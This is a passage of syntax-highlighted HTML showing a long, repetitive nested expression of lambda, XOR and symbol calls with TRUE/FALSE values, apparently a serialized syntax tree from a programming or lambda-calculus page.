class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span 